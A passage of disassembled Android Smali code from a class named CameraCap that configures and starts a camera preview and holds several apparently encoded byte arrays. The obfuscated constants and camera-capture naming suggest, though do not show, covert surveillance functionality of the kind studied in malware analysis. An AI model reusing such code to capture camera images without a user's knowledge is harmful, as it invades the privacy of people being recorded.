    invoke-virtual {v0, v1, v2}, Landroid/hardware/Camera$Parameters;->setPreviewSize(II)V

    const/16 v1, 0x11

    invoke-virtual {v0, v1}, Landroid/hardware/Camera$Parameters;->setPreviewFormat(I)V

    sget-object v1, Lcom/icontrol/protector/CameraCap;->f:Landroid/hardware/Camera;

    invoke-virtual {v1, v0}, Landroid/hardware/Camera;->setParameters(Landroid/hardware/Camera$Parameters;)V

    sget-object v0, Lcom/icontrol/protector/CameraCap;->f:Landroid/hardware/Camera;

    invoke-virtual {v0, p1}, Landroid/hardware/Camera;->setPreviewDisplay(Landroid/view/SurfaceHolder;)V

    sget-object p1, Lcom/icontrol/protector/CameraCap;->f:Landroid/hardware/Camera;

    invoke-virtual {p1}, Landroid/hardware/Camera;->startPreview()V
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_0

    goto :goto_5

    :goto_4
    invoke-virtual {p1}, Ljava/lang/Throwable;->printStackTrace()V

    :goto_5
    return-void

    :array_0
    .array-data 1
        -0x55t
        -0xft
        -0x8t
        -0x63t
        -0x11t
        0x4ct
        -0x17t
        -0x51t
    .end array-data

    :array_1
    .array-data 1
        0x24t
        0x70t
        0x21t
        0x62t
        0x65t
    .end array-data

    nop

    :array_2
    .array-data 1
        0x42t
        0x2t
        0x4et
        0xct
        0x11t
        0x5ct
        0x5dt
        -0x6et
    .end array-data

    :array_3
    .array-data 1
        0x65t
        0x63t
        -0x11t
        -0x1ft
    .end array-data

    :array_4
    .array-data 1
        0x7t
        0x2t
        -0x74t
        -0x76t
        0xet
        0x2ct
        0x10t
        0x1ft
    .end array-data
.end method

.method public surfaceDestroyed(Landroid/view/SurfaceHolder;)V
    .locals 0

    return-void
.end method
